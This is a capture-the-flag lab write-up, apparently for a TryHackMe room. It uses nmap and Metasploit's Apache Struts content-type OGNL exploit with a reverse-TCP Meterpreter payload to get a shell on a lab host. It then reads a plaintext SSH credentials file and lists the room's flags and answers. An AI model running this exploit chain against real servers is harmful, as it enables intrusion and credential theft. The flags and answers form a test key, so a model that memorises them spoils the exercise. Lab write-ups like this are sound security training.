# Day 10 - Metasploit-a-ho-ho-ho

**Date:** 30, May, 2021

**Author:** Dhilip Sanjay S

---

## Enumeration using Nmap

```bash
$ nmap -sC -sV -oN nmap.out 10.10.129.152
Nmap scan report for 10.10.129.152
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:f9:8c:32:ab:d6:8f:d4:31:4f:1c:3e:0a:af:42:32 (RSA)
|   256 43:68:cd:46:27:f0:11:2b:e0:ea:2e:d1:78:25:3d:c4 (ECDSA)
|_  256 04:9e:36:05:00:07:70:96:70:c4:2c:ec:e6:57:6c:9f (ED25519)
80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-title: Santa Naughty and Nice Tracker
|_Requested resource was showcase.action
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42261/tcp6  status
|   100024  1          45518/udp6  status
|   100024  1          51481/udp   status
|_  100024  1          57087/tcp   status
```

---

## Metasploit

- By running `search apache struts`:

```bash
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > search apache struts

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/struts_default_action_mapper          2013-07-02       excellent  Yes    Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
   1   exploit/multi/http/struts_dev_mode                       2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_multi_eval_ognl               2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
   3   exploit/multi/http/struts2_namespace_ognl                2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   4   exploit/multi/http/struts2_rest_xstream                  2017-09-05       excellent  Yes    Apache Struts 2 REST Plugin XStream RCE
   5   exploit/multi/http/struts2_code_exec_showcase            2017-07-07       excellent  Yes    Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution
   6   exploit/multi/http/struts_code_exec_classloader          2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   7   exploit/multi/http/struts_dmi_exec                       2016-04-27       excellent  Yes    Apache Struts Dynamic Method Invocation Remote Code Execution
   8   exploit/multi/http/struts2_content_type_ognl             2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
   9   exploit/multi/http/struts_code_exec_parameters           2011-10-01       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
   10  exploit/multi/http/struts_dmi_rest_exec                  2016-06-01       excellent  Yes    Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
   11  exploit/multi/http/struts_code_exec                      2010-07-13       good       No     Apache Struts Remote Command Execution
   12  exploit/multi/http/struts_code_exec_exception_delegator  2012-01-06       excellent  No     Apache Struts Remote Command Execution
   13  exploit/multi/http/struts_include_params                 2013-05-24       great      Yes    Apache Struts includeParams Remote Code Execution
```

- We'll use `struts2_content_type_ognl` as mentioned in the blogpost & configure the options:


```bash
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > use 8
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 10.10.19.104
RHOSTS => 10.10.19.104
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/struts2_content_type_ognl) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
TARGETURI => /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.19.104        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                  yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /showcase.action    yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal
```

- Run the exploit:

```bash
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.17.7.91:1234 
[*] Sending stage (3012548 bytes) to 10.10.19.104
[*] Meterpreter session 1 opened (10.17.7.91:1234 -> 10.10.19.104:45626) at 2021-05-30 11:12:02 +0530

meterpreter > shell
Process 54 created.
Channel 1 created.
```

---

### Compromise the web server using Metasploit. What is flag1?
- **Answer:** THM{3ad96bb13ec963a5ca4cb99302b37e12}
- **Steps to Reproduce:**

```bash
pwd
/usr/local/tomcat/webapps/ROOT

cat ThisIsFlag1.txt
THM{3ad96bb13ec963a5ca4cb99302b37e12}
```

---

### Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
- **Answer:** rudolphrednosedreindeer
- **Steps to Reproduce:** 

```bash
cd /home
ls
santa
cd santa
ls
ssh-creds.txt
cat ssh-creds.txt
santa:rudolphrednosedreindeer
```

---

### Who is on line 148 of the naughty list?
- **Answer:** Melisa Vanhoose
- **Steps to Reproduce:** 

```bash
[santa@ip-10-10-19-104 ~]$ ls
naughty_list.txt  nice_list.txt
[santa@ip-10-10-19-104 ~]$ cat naughty_list.txt -n | grep 148
   148  Melisa Vanhoose
```

---

### Who is on line 52 of the nice list?
- **Answer:** Lindsey Gaffney
- **Steps to Reproduce:** 

```bash
[santa@ip-10-10-19-104 ~]$ cat nice_list.txt -n | grep 52
    52  Lindsey Gaffney
```

---